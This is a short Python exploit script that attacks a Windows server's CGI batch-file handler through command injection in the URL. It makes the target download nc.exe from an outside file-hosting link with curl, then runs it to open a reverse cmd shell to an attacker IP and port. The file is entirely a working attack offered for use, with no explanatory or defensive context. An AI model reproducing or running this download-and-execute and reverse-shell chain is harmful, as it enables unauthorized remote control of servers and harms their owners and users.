import sys, requests
from time import sleep
attackerAddr = '192.168.43.241'
attackerPort = 8080
downloadNC = '&C%3A%5CWindows%5CSystem32%5Ccurl+https://cloud.send.cm/d/cjyt2p2o6gbuz4l43z2vtfvb3ci2yu4wloun7f4wop3hega3j6bzhtt2evmof6zfp6lekffm/nc.exe+--output+ncNC.exe'
ncRevershell = f'ncNC.exe+-e+cmd+{attackerAddr}+{str(attackerPort)}'
payload = '{}/cgi-bin/{}?&{}'

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('Usage: python3 exploit.py <target_url> <bat_name>`')
        exit()
    target_url = sys.argv[1]
    bat_name = sys.argv[2]
    requests.get('http://'+payload.format(target_url,bat_name,downloadNC))
    sleep(4)
    requests.get('http://'+payload.format(target_url,bat_name,ncRevershell))
